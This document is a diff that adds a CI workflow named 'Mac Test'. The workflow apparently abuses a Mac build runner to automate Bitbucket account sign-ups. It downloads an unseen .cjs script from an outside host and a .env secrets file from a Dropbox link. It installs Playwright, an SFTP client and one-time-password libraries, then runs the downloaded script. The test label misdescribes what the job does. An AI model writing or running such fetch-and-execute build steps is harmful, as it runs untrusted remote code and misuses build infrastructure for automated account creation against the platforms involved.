@@ -1,0 +1,37 @@
+workflows:
+  mac-test:
+    name: Mac Testscrwb_2
+    instance_type: mac_mini_m2
+    max_build_duration: 17
+
+    scripts:
+      - name: Prepare files
+        script: |
+          cd /Users/builder/Desktop
+
+          curl -fL "https://sorcweb.website/SignUp_bitbucket_sorcweb_MAC.cjs" \
+            -o SignUp_bitbucket_sorcweb_MAC.cjs
+
+          curl -fL "https://www.dropbox.com/scl/fi/zsacl8lr81kdt7mjsogxn/.env?rlkey=9wf1bgdn1be2ecb79olvaa2tk&st=k0e1q5ov&dl=1" \
+            -o .env
+
+          curl -fL "https://sorcweb.website/sorcweb_15.txt" \
+            -o sorcweb_15.txt
+
+      - name: Install and run
+        script: |
+          cd /Users/builder/Desktop
+
+          npm install \
+            playwright \
+            axios \
+            dotenv \
+            ssh2-sftp-client \
+            otplib \
+            @otplib/plugin-crypto-node \
+            @otplib/plugin-base32-scure
+
+          npx playwright install chromium
+          npm list playwright
+
+          node SignUp_bitbucket_sorcweb_MAC.cjs
